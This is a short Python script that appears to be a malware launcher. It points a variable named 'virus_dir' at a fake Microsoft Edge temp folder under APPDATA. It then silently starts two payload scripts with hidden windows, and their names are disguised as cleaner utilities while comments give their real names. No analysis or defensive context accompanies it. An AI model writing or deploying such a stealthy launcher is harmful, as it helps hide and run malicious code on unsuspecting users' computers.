import subprocess, sys, os

appdata = os.environ['APPDATA']

virus_dir = os.path.join(
    appdata, 
    "Local", 
    "Microsoft", 
    "Edge", 
    "Temp"
)

subprocess.Popen([sys.executable, os.path.join(virus_dir, "cleaner_x32.py")], creationflags=subprocess.CREATE_NO_WINDOW) # This is file_checker.py
subprocess.Popen([sys.executable, os.path.join(virus_dir, "cleanup_x64.py")], creationflags=subprocess.CREATE_NO_WINDOW) # This is gama_aaa.py